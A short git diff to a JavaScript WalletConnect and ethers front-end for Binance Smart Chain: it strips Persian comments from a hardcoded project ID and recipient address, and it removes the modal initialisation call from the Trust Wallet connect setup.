@@ -1,9 +1,8 @@
 import { WalletConnectModalSign } from "@walletconnect/modal-sign-html";
 import { ethers } from "ethers";
 
-// مقداردهی‌ها
-const projectId = "4d08946e6c316bed5e76b450ccbb5256"; // WalletConnect Project ID خودت
-const TO_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05"; // آدرس گیرنده BNB
+const projectId = "4d08946e6c316bed5e76b450ccbb5256";
+const TO_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";
 const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
 
 let userAddress = null;
@@ -19,9 +18,7 @@ const modal = new WalletConnectModalSign({
   }
 });
 
-async function startApp() {
-  await modal.init(); // این خط حیاتی است!
-
+function startApp() {
   document.getElementById("connectTrust").addEventListener("click", async () => {
     currentWallet = "trust";
     await connectWallet("https://link.trustwallet.com/wc?uri=");
